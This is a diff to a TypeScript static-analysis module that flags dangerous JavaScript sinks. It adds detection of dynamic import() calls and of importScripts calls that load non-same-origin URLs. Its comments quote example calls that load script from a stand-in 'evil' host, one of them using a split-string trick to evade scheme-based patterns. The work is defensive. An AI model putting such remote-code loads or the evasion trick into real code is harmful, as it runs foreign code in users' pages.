@@ -33,10 +33,15 @@
 // can unit test it directly.
 
 import type { SinkSpec } from './js-sink-analyzer.js';
-import { findSinkInvocations, isRemoteUrl, isStringLiteral } from './js-sink-analyzer.js';
+import { findSinkInvocations, isNonSameOriginUrl, isStringLiteral } from './js-sink-analyzer.js';
 
 export type { SinkSpec, Token } from './js-sink-analyzer.js';
-export { findSinkInvocations, isRemoteUrl, isStringLiteral, tokenize } from './js-sink-analyzer.js';
+export {
+  findSinkInvocations,
+  isNonSameOriginUrl,
+  isStringLiteral,
+  tokenize,
+} from './js-sink-analyzer.js';
 
 /**
  * The dynamic-code sinks. `eval` and the `Function` constructor evaluate
@@ -67,7 +72,7 @@ export const DYNAMIC_CODE_SINKS: readonly SinkSpec[] = [
 ];
 
 /**
- * `importScripts` loading a REMOTE script — cross-origin CODE, not a string.
+ * `importScripts` loading anything that is NOT same-origin — foreign CODE.
  *
  * VARIADIC: it loads every URL it is handed, so a same-origin first argument
  * does not make the call safe — `importScripts('/local.js', 'https://evil/x.js')`
@@ -76,8 +81,23 @@ export const DYNAMIC_CODE_SINKS: readonly SinkSpec[] = [
 export const REMOTE_IMPORT_SCRIPTS_SINK: SinkSpec = {
   name: 'importScripts',
   label: 'external importScripts (remote code)',
-  codeArgument: isRemoteUrl,
+  codeArgument: isNonSameOriginUrl,
   variadic: true,
+};
+
+/**
+ * A dynamic `import()` of a non-same-origin URL — remote code, loaded and run.
+ *
+ * `import` lexes as an identifier, so the analyzer walks it like any other
+ * callee and the specifier gets the same constant folding every other argument
+ * does: `import('ht' + 'tps://evil/x.js')` is the same module load as the
+ * unsplit literal, and a pattern anchored on the scheme could not see it.
+ * A STATIC `import … from '…'` is not a CALL, so it never matches.
+ */
+export const REMOTE_DYNAMIC_IMPORT_SINK: SinkSpec = {
+  name: 'import',
+  label: 'dynamic import() of a remote URL',
+  codeArgument: isNonSameOriginUrl,
 };
 
 /**
